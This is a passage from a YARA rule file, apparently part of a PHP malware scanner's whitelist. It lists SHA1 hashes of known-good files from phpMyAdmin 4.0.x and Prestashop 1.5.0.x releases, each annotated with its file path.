        hash.sha1(0, filesize) == "7aa5c4d0e51d219ebba86ddc644dca0355e5f6cd" or // doc/doctrees/faq.doctree
        hash.sha1(0, filesize) == "73efef4f340f00aa2823cf575c30d5fd63d571cc" or // doc/doctrees/config.doctree
        hash.sha1(0, filesize) == "ee8b1d455efa66a92ce3025d7c79758cb2767e76" or // libraries/DisplayResults.class.php

        /* Phpmyadmin 4.0.3 */
        hash.sha1(0, filesize) == "72e309407d3a741f9345cc252d8853013909c1cb" or // doc/doctrees/faq.doctree
        hash.sha1(0, filesize) == "70ab1c6ebdcc383fa12e68b24dff205cc313761a" or // doc/doctrees/config.doctree

        /* Phpmyadmin 4.0.4 */
        hash.sha1(0, filesize) == "ba8247bedab84b62d23998eb96be6f2a92d4d1bc" or // libraries/select_lang.lib.php
        hash.sha1(0, filesize) == "6feca5c241e41d8fdcfb0f9104f06fc27414206e" or // doc/doctrees/faq.doctree
        hash.sha1(0, filesize) == "5d01bc6404187356a5428ea392dda0304f5a06be" or // doc/doctrees/config.doctree
        hash.sha1(0, filesize) == "dfa5d49a57c3849589d7db123850fe22efe0e421" or // doc/html/_sources/faq.txt
        hash.sha1(0, filesize) == "dfa5d49a57c3849589d7db123850fe22efe0e421" or // doc/faq.rst

        /* Phpmyadmin 4.0.5 */
        hash.sha1(0, filesize) == "8690e479b31ee1705de8fd654eed504ea86255d6" or // libraries/plugins/auth/swekey/swekey.auth.lib.php
        hash.sha1(0, filesize) == "0fa37a1808b87318af1c8b909515926ea908e20d" or // server_databases.php
        hash.sha1(0, filesize) == "08b9be901a1cad1910f909b0c3308c80179faea8" or // locale/pl/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "1a39333456f3ed00f78c434cd2260aa1f6055d28" or // locale/zh_CN/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "086cf75edbc7a84d7e2da7acd4ef449414b04a30" or // locale/ja/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "5d941f85a5364e609fc1e772df46b11cd53a31ce" or // locale/it/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "38a06d88278ce2d049c27861f1065f946aee5fdb" or // locale/zh_TW/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "d8209cbed693cbfab4e49a20d2b72a545eff09d7" or // doc/doctrees/config.doctree
        hash.sha1(0, filesize) == "fb04115aa12c7ba54adcc64b20255b3e93916e94" or // libraries/DisplayResults.class.php
        hash.sha1(0, filesize) == "e80ac17842b54c099836c04e4eebf72f09c36559" or // doc/doctrees/faq.doctree

        /* Phpmyadmin 4.0.6 */
        hash.sha1(0, filesize) == "178edee119fd53a1ca87f289213faf34c6e23065" or // locale/it/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "89137874313404331edd64dd561ee72c1e90a966" or // locale/pl/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "21ace5bcde26b98a381091fc3dda588115bff565" or // locale/sv/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "819cfe3120478406300d5fc446d258df9790db10" or // locale/ja/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "5c0ba64f2f6f4de362cb2a227325194283edd64b" or // doc/doctrees/faq.doctree
        hash.sha1(0, filesize) == "5993a60e0f14ef9d898b3f82e7bb5faf410084c9" or // doc/doctrees/config.doctree
        hash.sha1(0, filesize) == "5bf1ebc6cd395fc8cc084f2b2ce45ad31a2e847f" or // libraries/DisplayResults.class.php

        /* Phpmyadmin 4.0.7 */
        hash.sha1(0, filesize) == "23590f9a72fd45409b79f238e6a32d394268d484" or // server_databases.php
        hash.sha1(0, filesize) == "f9b7639cb78d11bd6f55a89a4630409b1f0b4ed6" or // locale/zh_CN/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "6790cd3b963f31c4706689564bb3a758868e25e2" or // locale/ja/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "0c7b68640f071c0a7cf2d5c27b1ab1a557778c35" or // doc/doctrees/faq.doctree
        hash.sha1(0, filesize) == "c9d24ecbe33a5a9bed089be06008d5ace9fe8022" or // doc/doctrees/config.doctree
        hash.sha1(0, filesize) == "28d2a89687bf1ab53d52180043635f0290d3e848" or // locale/en_GB/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "2747f18959d06cadac8cd8d8a16b95ff8ef0fd25" or // locale/nb/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "8eb466ea26d87c9a5b55c8349b106f5b621d8347" or // libraries/DisplayResults.class.php

        /* Phpmyadmin 4.0.8 */
        hash.sha1(0, filesize) == "47b80bc9f6a053cbd794e349bf7c81e1ac523780" or // doc/doctrees/config.doctree
        hash.sha1(0, filesize) == "75f3774629d8bb599b4111a36a5b813e800b61bf" or // doc/doctrees/faq.doctree

        /* Phpmyadmin 4.0.9 */
        hash.sha1(0, filesize) == "1db96b0f2bab1a326255a271c190859ca0d2fd15" or // locale/ja/LC_MESSAGES/phpmyadmin.mo
        hash.sha1(0, filesize) == "5dc82742fbbe5b2322321995474a0a1a784736a1" or // doc/doctrees/faq.doctree
        hash.sha1(0, filesize) == "f8ed7a657101c83ca24761111dfcf8298818ea84" or // doc/doctrees/config.doctree

        /* Phpmyadmin 4.0.10 */
        hash.sha1(0, filesize) == "3cb1858da44833ca8bca16c2651881d5d899a1dc" or // doc/doctrees/faq.doctree
        hash.sha1(0, filesize) == "cabf489740e6cf929cc6641dc68caac9b7a402a1"    // doc/doctrees/config.doctree

}
/* Copyright (C) NBS System - All Rights Reserved
   Licensed under GNU LGPL v3.0 – See the LICENSE notice for details
*/

import "hash"

private rule Prestashop : ECommerce
{
    meta:
        generated = "2016-07-28T17:41:37.968993"

    condition:
        /* Prestashop 1.5.0.0 */
        hash.sha1(0, filesize) == "a452c0fa253dc98ac038374eabda7a584696cf61" or // admin-dev/tabs/AdminTaxRulesGroup.php
        hash.sha1(0, filesize) == "3ac94ddbcae6c946cb6a07125ac9f9f0e548d433" or // modules/paysafecard/PrepaidServices.php
        hash.sha1(0, filesize) == "eb3eea89c40d6e0a71d18f75fe36361a996607dc" or // classes/PDF.php
        hash.sha1(0, filesize) == "92ca42f51f3aaea36e0e3c6ba4bbad8dcdd334fe" or // img/t/AdminSubDomains.gif
        hash.sha1(0, filesize) == "e0480a54653a7be00c03d6ad3b20b856ecaf423d" or // install-dev/classes/Module.php
        hash.sha1(0, filesize) == "45329bf8fbed6e07169bfb1998383afbdf1927f0" or // modules/ekomi/logo.gif
        hash.sha1(0, filesize) == "dd46d277fbf67156ccb3d9b66b2d56a1a4298e48" or // tools/smarty_v2/internals/core.create_dir_structure.php
        hash.sha1(0, filesize) == "dd469f741cc6614d74b6affecf08125cd9a0d3b7" or // modules/secuvad/secuvad_response.php
        hash.sha1(0, filesize) == "af90f72c45dd802a4818b19175212349e62f0b57" or // classes/ObjectModel.php
        hash.sha1(0, filesize) == "0d02b500dec55c296e35609b344a017a62665851" or // admin-dev/tabs/AdminLanguages.php
        hash.sha1(0, filesize) == "c4254197f75de7af77571abf5d8d4356a12642c7" or // modules/secuvad/classes/Secuvad_connection.php
        hash.sha1(0, filesize) == "aec9cbd49ede5354b8cb2a10c3ef92d928fbabfe" or // install-dev/classes/Language.php
        hash.sha1(0, filesize) == "240cb8ff71cc91b2b0636c77e4714522131eba01" or // tools/smarty/sysplugins/smarty_internal_templatelexer.php
        hash.sha1(0, filesize) == "e5614b2b765520386a4a2778aab8d504381602d1" or // admin-dev/tabs/AdminCarriers.php
        hash.sha1(0, filesize) == "ec219db83b83912042740477acc7cc304e3b445f" or // admin-dev/tabs/AdminDb.php
        hash.sha1(0, filesize) == "a35984b3c4fe0787f5bf5add97cf97a96f1f5d33" or // modules/mondialrelay/kit_mondialrelay/tools/nusoap/lib/nusoap.php
        hash.sha1(0, filesize) == "84c7830bbb0ff4ba8d79644ea6abf3aeec93b734" or // admin-dev/header.inc.php
        hash.sha1(0, filesize) == "be7f535eac6a63d207bb873f49f3a57e9667e0f1" or // modules/fianetfraud/fianet/classes/fianet_key_64bits.php
        hash.sha1(0, filesize) == "a04b99dc2e88f35ea475e4f18671ccb76c312bb5" or // admin-dev/tabs/AdminShipping.php
        hash.sha1(0, filesize) == "ee2e386bc1a5cfc7cf20b7c6fed45bfee8502aae" or // admin-dev/tabs/AdminCustomerThreads.php
        hash.sha1(0, filesize) == "ce370dfd9f10189763e549c8cc3f62a47fd46d64" or // install-dev/preactivation.php
        hash.sha1(0, filesize) == "86df5348fa8086ee123b20435d56b33a9bd366df" or // modules/mondialrelay/lib/nusoap/class.soap_server.php
        hash.sha1(0, filesize) == "ce5741a19f3c7686d0e5c37da57954e930366be3" or // admin-dev/tabs/AdminAttachments.php
        hash.sha1(0, filesize) == "b99b3ab45c59b45e7306ab28f17fd15507b93bfb" or // admin-dev/tabs/AdminCMSCategories.php
        hash.sha1(0, filesize) == "85d9bc8987f8ddcde06296623aa270c38004ca16" or // modules/mondialrelay/kit_mondialrelay/RechercheDetailPointRelais_ajax.php
        hash.sha1(0, filesize) == "6f3dc8c7b6e87b2a11b43e6c7de9bea082c89c1a" or // modules/blockadvertising/blockadvertising.php
        hash.sha1(0, filesize) == "8bdd94fe69af79376fa1e83290b7e9698786c22a" or // admin-dev/tabs/AdminScenes.php
        hash.sha1(0, filesize) == "2e34d46c435e61001e92d014251dd70fa203144b" or // modules/secuvad/secuvad_config.php
        hash.sha1(0, filesize) == "fd6d0ec0e53173ff70535e7ae26216e440fd0e9c" or // modules/mondialrelay/kit_mondialrelay/RecherchePointRelais_ajax.php
        hash.sha1(0, filesize) == "42ba6141b60a2500e12cd3b523c41fe831576ccf" or // modules/shopimporter/shopimporter.php
        hash.sha1(0, filesize) == "8c1d1237096589873a68e2a9fce0e2521fe06b01" or // modules/statsproduct/statsproduct.php
        hash.sha1(0, filesize) == "499d53f4e93d97e251fcc2864cf6b01bcfb5965e" or // modules/themeinstallator/themeinstallator.php
        hash.sha1(0, filesize) == "d3e143a05ab214ea8141cce805514808cd502af1" or // classes/Product.php
        hash.sha1(0, filesize) == "f664812d6de055014e272966b70a4e5808949f1b" or // admin-dev/tabs/AdminImageResize.php
        hash.sha1(0, filesize) == "aea3d997519354fbf43ed1098cfda0e9614255f5" or // modules/paypal/paypal.php
        hash.sha1(0, filesize) == "b2b948da08c0437d0bac24f87090ad9eb86ccdf1" or // admin-dev/tabs/AdminSlip.php
        hash.sha1(0, filesize) == "1439165e3e6a3c945c1f017c54f25a7e2ecf3e67" or // admin-dev/tabs/AdminPayment.php
        hash.sha1(0, filesize) == "9ebab008d87799dcdfc697189c37c12d622268ae" or // modules/criteo/criteo.php
        hash.sha1(0, filesize) == "1cb664830a6027d3825f8535953603317af4ac73" or // classes/Tools.php
        hash.sha1(0, filesize) == "491e35cb839361fcf053d8f5cb462f2cc1efe869" or // admin-dev/tabs/AdminAddresses.php
        hash.sha1(0, filesize) == "9901b50f3171f3117a96922e0614f68ca8ea7781" or // modules/blockcategories/blockcategories.php
        hash.sha1(0, filesize) == "d6c32b29ca0f7077fd1b47022bc16284928e05f7" or // admin-dev/tabs/AdminProducts.php
        hash.sha1(0, filesize) == "681e6b1034ec0ced209b09d9859ba5c2feee3797" or // admin-dev/tabs/AdminOrdersStates.php
        hash.sha1(0, filesize) == "e2a6faa994b437a00e362a2b0ddc4f5f3f4c8223" or // modules/treepodia/treepodia.php
        hash.sha1(0, filesize) == "00d4ac0499af32cb8389dd34e2418ba4aa3b6997" or // modules/producttooltip/sample.gif
        hash.sha1(0, filesize) == "a35984b3c4fe0787f5bf5add97cf97a96f1f5d33" or // modules/mondialrelay/lib/nusoap/nusoap.php
        hash.sha1(0, filesize) == "cc809d3340e5f16e59f1f8727798fc4d219853d5" or // admin-dev/tabs/AdminTranslations.php
        hash.sha1(0, filesize) == "27c07a3c1538b3695d718fe6afbbc8a8afac5746" or // install-dev/classes/ConfigurationTest.php
        hash.sha1(0, filesize) == "c74e39e3a51f093d180793ccf38c7345e360d8da" or // classes/Link.php
        hash.sha1(0, filesize) == "8964a9cd1b695bc7c5ad1289f48fb68f1f4fb8a9" or // tools/fpdf/font/makefont/makefont.php
        hash.sha1(0, filesize) == "513918ddb751ba31b9adea8dbbbd9476b9221369" or // modules/cashticket/PrepaidServicesAPI.php
        hash.sha1(0, filesize) == "a09cb69e452956c6d10f46ecad57810a55de29de" or // admin-dev/tabs/AdminInformation.php
        hash.sha1(0, filesize) == "c1070b84bc4dd6d878b0426a08a9feb4b19bc1e7" or // tools/pear/PEAR.php
        hash.sha1(0, filesize) == "0181b670b873f7a9b1fa91f2ac53202f6b4051bc" or // classes/Module.php
        hash.sha1(0, filesize) == "683e69d49819a1ebef945ad8c3501ce67aee9a18" or // admin-dev/tabs/AdminPreferences.php
        hash.sha1(0, filesize) == "bc6f2df56997b6883ea2bcd1ad9a9c3ef63b2201" or // modules/cashticket/PrepaidServices.php
        hash.sha1(0, filesize) == "1d842bed57e7fdc4f3746439f55ce4afcd79a53d" or // classes/HelpAccess.php
        hash.sha1(0, filesize) == "f2a3ded357b5533df506847db981f1ece6e03f8c" or // admin-dev/tabs/AdminOrders.php
        hash.sha1(0, filesize) == "975ee99560f597cdf3aad06ee19a8d1a041a3a06" or // tools/swift/Swift/Message/Headers.php
        hash.sha1(0, filesize) == "41e2413dbbd959791cba5469df1eee39f475b65f" or // modules/ebay/ebay.php
        hash.sha1(0, filesize) == "9ca3de05a448367f13177b13d93b6a80792f2373" or // modules/dejala/dejalacarrierutils.php
        hash.sha1(0, filesize) == "2d40bf19f68a0190b2953fa7c70d1df144f4aec7" or // admin-dev/tabs/AdminReturn.php
        hash.sha1(0, filesize) == "23a7027f52727fe1bc321136f123c3e34e50312f" or // install-dev/index.php
        hash.sha1(0, filesize) == "ea94d1972040c85b34b9b2f0e2156119417840dc" or // classes/Language.php
        hash.sha1(0, filesize) == "fb5decf3d70a855e53b9db331394617a7ab3af89" or // tools/swift/Swift/Plugin/MailSend.php
        hash.sha1(0, filesize) == "86df5348fa8086ee123b20435d56b33a9bd366df" or // modules/mondialrelay/kit_mondialrelay/tools/nusoap/lib/class.soap_server.php
        hash.sha1(0, filesize) == "7c33cb59df736f72972db65b9cd05e048e0fd02b" or // admin-dev/tabs/AdminCarts.php
        hash.sha1(0, filesize) == "fc87b09ee7bb2b079809687c8fe6a680ce8f9188" or // modules/mondialrelay/mondialrelay.php
        hash.sha1(0, filesize) == "1734d2cd09488d74a4321ee2d7b1b19fb92c84e5" or // tools/smarty_v2/plugins/function.html_image.php
        hash.sha1(0, filesize) == "3d994da7a17f7a86155599c4e1798cd71548e369" or // classes/AdminTab.php
        hash.sha1(0, filesize) == "df3ea34a79261710a807d3651c1874477966e2c4" or // admin-dev/tabs/AdminModulesPositions.php
        hash.sha1(0, filesize) == "c3d268243d4da413de89939d8e9a9e16731046e5" or // modules/uspscarrier/uspscarrier.php
        hash.sha1(0, filesize) == "35fc9c2e5258db3ec4b742acbabcbf4ac40eb5b0" or // classes/SpecificPrice.php
        hash.sha1(0, filesize) == "a7b87bbc239c611fd7307a41cbf4a6cdaedd0c68" or // admin-dev/tabs/AdminTaxes.php
        hash.sha1(0, filesize) == "49fd193d79d5d13af0e70e424c255266f9de266a" or // admin-dev/tabs/AdminCategories.php
        hash.sha1(0, filesize) == "e51c9340ec69ddd6213b7bae9272e33e4ac61e33" or // modules/paysafecard/PrepaidServicesAPI.php
        hash.sha1(0, filesize) == "0838ff9dd13d082cf8f9931f005a59760cbac72d" or // admin-dev/tabs/AdminAttributeGenerator.php
        hash.sha1(0, filesize) == "b71d2c002ad93516af5b916fd4e8dfc2039bb0b2" or // admin-dev/tabs/AdminFeatures.php
        hash.sha1(0, filesize) == "ddf9748c423633c4bb2e697fa523aa251d073d40" or // modules/statslive/statslive.php
        hash.sha1(0, filesize) == "974c4eb92994ab511413fcf7271e976c7a5b952a" or // themes/prestashop/img/icon/my-account.gif
        hash.sha1(0, filesize) == "8e1e9763f836d6a0d5a71db5624dab6d07d4797c" or // modules/hipay/hipay.php
        hash.sha1(0, filesize) == "b641148c725d0851575b6e32935c84ff95bf45b7" or // modules/mondialrelay/kit_mondialrelay/tools/nusoap/lib/class.soap_transport_http.php
        hash.sha1(0, filesize) == "5edb689475a63687000799f45bf20e2ce51d256d" or // img/admin/ok.gif
        hash.sha1(0, filesize) == "d9e81a92238b286bbfb7c962201643b41a7a3785" or // admin-dev/tabs/AdminAttributesGroups.php
        hash.sha1(0, filesize) == "1f5cbb7b1972a034f430eb2130732c09ae66802e" or // modules/upscarrier/upscarrier.php
        hash.sha1(0, filesize) == "047c6c80429e97b1cfd6897942dc6f4abb555e59" or // modules/mondialrelay/googlemap.php
        hash.sha1(0, filesize) == "693742c6c60075309d9e44aa91867f7c4b3bf86f" or // admin-dev/tabs/AdminModules.php
        hash.sha1(0, filesize) == "9c9fee2d0e902d408dea5d4a8b740f4f62fb85e8" or // modules/ogone/validation.php
        hash.sha1(0, filesize) == "509eecfa6835f0dc87f3cd16116344640bd28bf0" or // modules/fedexcarrier/fedexcarrier.php
        hash.sha1(0, filesize) == "b641148c725d0851575b6e32935c84ff95bf45b7" or // modules/mondialrelay/lib/nusoap/class.soap_transport_http.php
        hash.sha1(0, filesize) == "d2aa2a45c3059eb3bd3fbf933e9a7ffa66fabaea" or // modules/secuvad/classes/Secuvad_flux.php
        hash.sha1(0, filesize) == "a68dee63f5c9cd0695fd8f40061d0413e8785301" or // admin-dev/tabs/AdminAccess.php
        hash.sha1(0, filesize) == "eb872c8d47081d49e3ac75ae21f623803b941949" or // classes/Tab.php
        hash.sha1(0, filesize) == "099d66ec96c35082c3818ec05530688dc8b99a60" or // tools/pclzip/pclzip.lib.php
        hash.sha1(0, filesize) == "26ee6a5f67a1f0c5d061bc31cd92f5ac815ec34a" or // modules/statsforecast/statsforecast.php
        hash.sha1(0, filesize) == "5edb689475a63687000799f45bf20e2ce51d256d" or // install-dev/img/ok.gif
        hash.sha1(0, filesize) == "377271a851966af1c3c700371d31da9ff2e8d1d3" or // modules/statscheckup/statscheckup.php
        hash.sha1(0, filesize) == "92ca42f51f3aaea36e0e3c6ba4bbad8dcdd334fe" or // img/admin/subdomain.gif

        /* Prestashop 1.5.0.1 */
        hash.sha1(0, filesize) == "fa3aa53120cc7eb50740051e0c94aae34050f8e7" or // modules/ebay/ebay.php
        hash.sha1(0, filesize) == "2770c4f68b722e2f6e32d8b96fed8132c267e75c" or // install-dev/preactivation.php
        hash.sha1(0, filesize) == "b35a5bcbe1a88b607d07eafb9eec4531eade3ba3" or // modules/statslive/statslive.php
        hash.sha1(0, filesize) == "5edb689475a63687000799f45bf20e2ce51d256d" or // install-new/theme/img/ok.gif
        hash.sha1(0, filesize) == "ec98d4f824570c4822f6d7d13191649230c215ba" or // modules/paysafecard/PrepaidServices.php
        hash.sha1(0, filesize) == "ec25ae8233b98bec08b1a33484ff10e740870b5c" or // classes/Link.php
        hash.sha1(0, filesize) == "4e5e9da68d98b175ba252bfd16a1a4ddf2ffa9ab" or // controllers/admin/AdminModulesController.php
        hash.sha1(0, filesize) == "d28b26791aeb86c5261461efbe961b0c5ae1a575" or // controllers/admin/AdminCategoriesController.php
        hash.sha1(0, filesize) == "749062bd477dc948854ace176501cd510efbb510" or // modules/paysafecard/PrepaidServicesAPI.php
        hash.sha1(0, filesize) == "b6908610d8f632e82bed5d99abe9dfc5521fb849" or // modules/twenga/export.php
        hash.sha1(0, filesize) == "62d69e1402d43e281e1e37780602d346661733fc" or // classes/PDF.php
        hash.sha1(0, filesize) == "09e4af7aa0bc43d9cc574704766d5cf1934acdbd" or // modules/paypal/paypal.php
        hash.sha1(0, filesize) == "d2676acb8e212973c68a7e2efca4649960cacf2b" or // classes/SpecificPrice.php
        hash.sha1(0, filesize) == "3f37004ded4d1d5698c900a58b85b412aacd2ee0" or // modules/cashticket/PrepaidServicesAPI.php
        hash.sha1(0, filesize) == "21ad83d8cdab8413d55bbd067031e3d313f3a1f8" or // controllers/admin/AdminTranslationsController.php
        hash.sha1(0, filesize) == "92ca42f51f3aaea36e0e3c6ba4bbad8dcdd334fe" or // install-new/data/img/t/AdminSubDomains.gif
        hash.sha1(0, filesize) == "094b2b55695d8bfbb0941e3d5d3c4b4f072ef7d0" or // modules/hipay/hipay.php
        hash.sha1(0, filesize) == "8d343bb599325b685e402b14508e3681c63862d3" or // controllers/admin/AdminCustomerThreadsController.php
        hash.sha1(0, filesize) == "a314059c41abac9f8f662ec8233c8515f6e948b2" or // modules/shopimporter/shopimporter.php
        hash.sha1(0, filesize) == "9fae3ea6be599d26f61673e4a43b64535b297d10" or // install-new/upgrade/classes/Language.php
        hash.sha1(0, filesize) == "0dcf9eefba5867321f75da069602bcaff14fb341" or // install-dev/classes/Module.php
        hash.sha1(0, filesize) == "9d7941b8de7a541ba1653feb92113ca0f598e8cc" or // modules/canadapost/canadapost.php
        hash.sha1(0, filesize) == "165550e6c724069a7a8c363744c616d04c3b01f1" or // controllers/admin/AdminShopController.php
        hash.sha1(0, filesize) == "6b0754fe9ae57b3ab249c13fb3e8cf5fa1f7a3c4" or // controllers/admin/AdminImagesController.php
        hash.sha1(0, filesize) == "eae1b262d0f072c8b7376f717c6aa364cdcbccf5" or // classes/Module.php
        hash.sha1(0, filesize) == "38a6344914ad89045e89c82e9bc4ce4c57938922" or // controllers/admin/AdminProductsController.php
        hash.sha1(0, filesize) == "c0f338c3e3d766c25cb5fc6d04e00023116e34ab" or // modules/upscarrier/upscarrier.php
        hash.sha1(0, filesize) == "59af18652900d072c261772864909934d0d7aced" or // modules/blockadvertising/blockadvertising.php
        hash.sha1(0, filesize) == "0c07b1d0b44dbe04d25c09c850965b3a7a02d88e" or // install-new/models/install.php
        hash.sha1(0, filesize) == "8d028c462be2022a871a0dcd3d64c1152ca3e111" or // classes/Product.php
        hash.sha1(0, filesize) == "739ff6dae69e09f1822ecc89f77e0a997f9dd318" or // modules/cashticket/PrepaidServices.php
        hash.sha1(0, filesize) == "ceba773c122c4a5c012d888f8b0c2b95f3a34820" or // classes/HelpAccess.php
        hash.sha1(0, filesize) == "895ef9918875bab93e701790fb9f8756b8481d2d" or // modules/secuvad/secuvad_response.php
        hash.sha1(0, filesize) == "11509527e22f8382feb3b77887bbceb3439960af" or // classes/ObjectModel.php
        hash.sha1(0, filesize) == "66db725de8a5264d3c694d1cb7b7afdc0654eb0b" or // controllers/admin/AdminCmsCategoriesController.php
        hash.sha1(0, filesize) == "a4e89483deb7a7558aff1d94b810ede509ab4f64" or // modules/dejala/dejalacarrierutils.php
        hash.sha1(0, filesize) == "d09d1a8c675ebf22568223293d3dd93a85873b7d" or // modules/ogone/validation.php
        hash.sha1(0, filesize) == "05e19f190a991aa427499858037586eca4e186fc" or // modules/themeinstallator/themeinstallator.php
        hash.sha1(0, filesize) == "6b8ec471e3395781724da3d2a90fe0b40bea3dab" or // classes/Helper.php
        hash.sha1(0, filesize) == "91c081cac69bacd2520ba61cb913bec0730e5f5c" or // modules/secuvad/classes/Secuvad_connection.php
        hash.sha1(0, filesize) == "d8b3da5ab9482eb4e9b3f5faef359d456d2e9c23" or // modules/fedexcarrier/fedexcarrier.php
        hash.sha1(0, filesize) == "895346452b20ab6a527dced12bdaf6700e32f9ee" or // install-dev/classes/Language.php
        hash.sha1(0, filesize) == "f48401d3311c0218c7de2c388a5704a52b5c8f0d" or // modules/secuvad/classes/Secuvad_flux.php
        hash.sha1(0, filesize) == "f417af86c6c422b9c5e21f076be7d624b2c1df4c" or // install-dev/index.php
        hash.sha1(0, filesize) == "a75e482a805d0d5c12b192a03e15d8acc0ebf9ab" or // tools/smarty/sysplugins/smarty_internal_templatelexer.php
        hash.sha1(0, filesize) == "3eb33e0d506cc2574100cae9fe3e8321b86ff755" or // modules/criteo/criteo.php
        hash.sha1(0, filesize) == "2433f9a2c9bb822e96d7bac1558ca584ec12f152" or // classes/Language.php
        hash.sha1(0, filesize) == "6ccde72485efa4e2f5ed77afbe771023985800e3" or // classes/Image.php
        hash.sha1(0, filesize) == "27b7b6d6c8f978ac2735160f8aeea123de50c0f3" or // tools/tcpdf/tcpdf.php
        hash.sha1(0, filesize) == "78b3d1cfbe187484d19faa6fcad9c390a4e57069" or // classes/Tools.php
        hash.sha1(0, filesize) == "fa503eae31c802f6de669751685cb7a1c9c3ae4f" or // classes/Tab.php
        hash.sha1(0, filesize) == "665c16e0527765279789a830a257032531548fbb" or // tools/swift/Swift/Plugin/MailSend.php
        hash.sha1(0, filesize) == "7060148bf1607846e51ea034109e50c40d8ded74" or // modules/statsforecast/statsforecast.php
        hash.sha1(0, filesize) == "a6ac0831e94e1b7a55b112741ff5bc9486faab11" or // classes/HelperList.php
        hash.sha1(0, filesize) == "14dbd6ea8884b2dbe345906301edea17904406e1" or // modules/mondialrelay/mondialrelay.php
        hash.sha1(0, filesize) == "c4d6bd4c84ff8daab7cf4289c7ad97bad51efbcd" or // modules/blockcategories/blockcategories.php
        hash.sha1(0, filesize) == "aacb5869c03c823dcac62422fae2011c62269da0" or // install-new/upgrade/classes/Module.php
        hash.sha1(0, filesize) == "28cab8b36661411ce4acf28631a7310ebd6f2b17" or // classes/ConfigurationTest.php
        hash.sha1(0, filesize) == "5c6296a4a233f28ea083abb86541e361d70c92f0" or // controllers/admin/AdminTaxesController.php
        hash.sha1(0, filesize) == "1a1ff3a7d29ce3af2ec0dc271ce76275b0083d13" or // classes/AdminTab.php
        hash.sha1(0, filesize) == "0d0a1f725b315b01bfb514df1b1056ead661dd3a" or // classes/Dispatcher.php
        hash.sha1(0, filesize) == "2ca04936523885131d8bf4c223a9c363f9612fea" or // modules/treepodia/treepodia.php
        hash.sha1(0, filesize) == "0b744316240ccadc5cbccc1850eb2d810342f28a" or // tools/tcpdf/barcodes.php
        hash.sha1(0, filesize) == "9a7e58db4eac152a5882ee8d54d41f632c2302c9" or // classes/HelperOptions.php
        hash.sha1(0, filesize) == "64109b57ca7353c2abd5c7bb42e5435f8c12a448" or // classes/AdminController.php
        hash.sha1(0, filesize) == "e97e9052cc55d40d4817163092ae93fd91cf8433" or // modules/productcomments/productcomments.php
        hash.sha1(0, filesize) == "89850ad0c8cedc3d3da2ad33a1ba553a06e8112e" or // tools/tcpdf/2dbarcodes.php
        hash.sha1(0, filesize) == "9ea7bcd0c1d7e00bae4364dc2fef0460b6a580cc" or // modules/uspscarrier/uspscarrier.php
        hash.sha1(0, filesize) == "8cd1622fe9d1b3b5144cae4e14da5e7cd172d518" or // install-new/classes/xmlLoader.php

        /* Prestashop 1.5.0.2 */
        hash.sha1(0, filesize) == "02382b1916b4adc1cb0891723427a0a420d88a3b" or // install-dev/preactivation.php
        hash.sha1(0, filesize) == "77b81d39b518631d44dcebcd59e96076ed410af1" or // install-dev/php/migrate_orders.php
        hash.sha1(0, filesize) == "45d83a9cea487c431ad616fef3578a84d61202bf" or // classes/Link.php
        hash.sha1(0, filesize) == "ce13ad7b5a0ab0a911817b8de452a41cf9ad70b7" or // tools/tcpdf/tcpdf.php
        hash.sha1(0, filesize) == "35c632774a06ab697a274564861b6a268e958731" or // controllers/admin/AdminCategoriesController.php
        hash.sha1(0, filesize) == "4b2825805d7de3a5f94b499ba53b9bb34e10b674" or // modules/blockadvertising/blockadvertising.php
        hash.sha1(0, filesize) == "1fdfb61cf8a30f120193044d8ebfa66c26b12fbc" or // controllers/admin/AdminTaxesController.php
        hash.sha1(0, filesize) == "b8b3871542b329db03fa8aa40d20f17b20a7d714" or // classes/SpecificPrice.php
        hash.sha1(0, filesize) == "d0f9a27d9293c295f7f7865ab509747a035761f3" or // controllers/admin/AdminTranslationsController.php
        hash.sha1(0, filesize) == "56d7208548312556b81e6df41a74cb57391cd57d" or // controllers/admin/AdminShopController.php
        hash.sha1(0, filesize) == "d2e8d95820f582aa6e4a7f63b8325b908a8dd299" or // install-new/upgrade/classes/Language.php
        hash.sha1(0, filesize) == "6b70b946715e6c6c0c80b6b9e25d705135601f73" or // install-dev/classes/Module.php
        hash.sha1(0, filesize) == "e549ae29bede518d60a59d97716317e3490a41ec" or // controllers/admin/AdminRequestSqlController.php
        hash.sha1(0, filesize) == "c96f626e843b6e21c91030e4386776dc4a664f5b" or // controllers/admin/AdminImagesController.php
        hash.sha1(0, filesize) == "aff8c299fd524c674efc18c436f321dc77beefbd" or // classes/Module.php
        hash.sha1(0, filesize) == "2dff5acffa580f2ac8924262295b8c73aca434d1" or // controllers/admin/AdminProductsController.php
        hash.sha1(0, filesize) == "deb8a12afa3d9033e4c5151709029a7d593004a9" or // modules/themeinstallator/themeinstallator.php
        hash.sha1(0, filesize) == "3546b92fbf2cf41d6b7df983f25c3eaeb5b66203" or // install-new/models/install.php
        hash.sha1(0, filesize) == "2bd7119b422327dd1c57104f7ef6857e1a698c7f" or // classes/Product.php
        hash.sha1(0, filesize) == "db57aae4671333e93692df20294cc40d7711a6fb" or // controllers/admin/AdminCmsCategoriesController.php
        hash.sha1(0, filesize) == "c2434cd78d5d2bcacc40f33e09b50aa520da063e" or // classes/helper/HelperOptions.php
        hash.sha1(0, filesize) == "1c91c55bbd39f41aa78664ef9209312c78e273fe" or // install-dev/classes/Language.php
        hash.sha1(0, filesize) == "afd368d0a1b3d6a001e6861b7e39e347df942c92" or // install-dev/index.php
        hash.sha1(0, filesize) == "c07153307b9897846341a56d5df8cfd21d9a26ae" or // tools/smarty/sysplugins/smarty_internal_templatelexer.php
        hash.sha1(0, filesize) == "4c6c64654db99bff9bffefc5e2f03529ec7b2e12" or // classes/Language.php
